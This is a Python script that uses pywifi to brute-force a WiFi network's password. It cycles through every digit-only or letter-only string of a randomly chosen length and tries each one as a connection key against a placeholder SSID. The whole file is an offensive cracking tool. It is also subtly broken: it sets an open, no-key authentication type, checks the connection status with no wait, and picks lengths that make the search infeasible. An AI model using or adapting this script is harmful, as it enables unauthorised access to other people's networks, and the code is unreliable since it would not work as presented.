import itertools

import random

import pywifi

from pywifi import const

# initialize wifi interface

wifi = pywifi.PyWiFi()

iface = wifi.interfaces()[0]

iface.disconnect()

# read input

choice = input("My choice is: ")

# define brute force functions

def bruteforce_numbers(length):

    chars = "0123456789"

    for pwd in itertools.product(chars, repeat=length):

        pwd_str = "".join(pwd)

        print("Trying", pwd_str)

        profile = pywifi.Profile()

        profile.ssid = "YOUR_WIFI_SSID"

        profile.auth = const.AUTH_ALG_OPEN

        profile.akm.append(const.AKM_TYPE_NONE)

        profile.cipher = const.CIPHER_TYPE_CCMP

        profile.key = pwd_str

        iface.remove_all_network_profiles()

        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)

        if iface.status() == const.IFACE_CONNECTED:

            print("\033[32mPassword found:", pwd_str, "\033[0m")

            return

def bruteforce_letters(length):

    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    for pwd in itertools.product(chars, repeat=length):

        pwd_str = "".join(pwd)

        print("Trying", pwd_str)

        profile = pywifi.Profile()

        profile.ssid = "YOUR_WIFI_SSID"

        profile.auth = const.AUTH_ALG_OPEN

        profile.akm.append(const.AKM_TYPE_NONE)

        profile.cipher = const.CIPHER_TYPE_CCMP

        profile.key = pwd_str

        iface.remove_all_network_profiles()

        tmp_profile = iface.add_network_profile(profile)

        iface.connect(tmp_profile)

        if iface.status() == const.IFACE_CONNECTED:

            print("\033[32mPassword found:", pwd_str, "\033[0m")

            return

# run chosen brute force function

if choice == "1":

    length = random.randint(8, 20)

    print("Starting WiFi password bruteforce with NUMBERS ONLY", length, "Chars")

    bruteforce_numbers(length)

elif choice == "2":

    length = random.randint(8, 20)

    print("Starting WiFi password bruteforce with letters only (big and small)", length, "Chars")

    bruteforce_letters(length)

else:

    print("Invalid choice")
